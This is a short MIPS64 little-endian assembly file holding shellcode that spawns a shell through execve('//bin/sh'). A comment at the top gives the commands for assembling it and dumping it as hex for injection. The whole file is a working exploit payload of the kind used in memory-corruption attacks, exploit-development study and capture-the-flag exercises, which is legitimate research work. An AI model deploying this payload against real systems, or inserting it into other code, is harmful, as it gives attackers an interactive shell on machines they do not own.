/*
Remember to change `-march=mips64r2` to `-march=mips64r6` for Release 6 code

/usr/bin/mips64-linux-gnuabi64-as -EL -64 -march=mips64r2 -o /tmp/sc.o shellcode_64_le.s && /usr/bin/mips64-linux-gnuabi64-objcopy -j .shellcode -Obinary /tmp/sc.o /tmp/sc.bin && xxd -p /tmp/sc.bin | tr -d '\n' && echo
*/

.section .shellcode,"awx"
.global _start
.global __start
_start:
__start:
.set noreorder
.set nomips16
.set noat
.p2align 2
    /* execve(path='//bin/sh', argv=NULL, envp=NULL) */
    /* push b'//bin/sh\x00' */
    li $t1, 0x69622f2f
    sw $t1, -12($sp)
    li $t1, 0x68732f6e
    sw $t1, -8($sp)
    sw $zero, -4($sp)
    daddiu $sp, $sp, -12
    daddu $a0, $sp, $0 /* mov $a0, $sp */
    /* set a1 to 0 */
    slti $a1, $zero, 0xFFFF /* $a1 = 0 */
    /* set a2 to 0 */
    slti $a2, $zero, 0xFFFF /* $a2 = 0 */
    /* call execve() */
    ori $v0, $zero, 5057
    syscall 0x40404
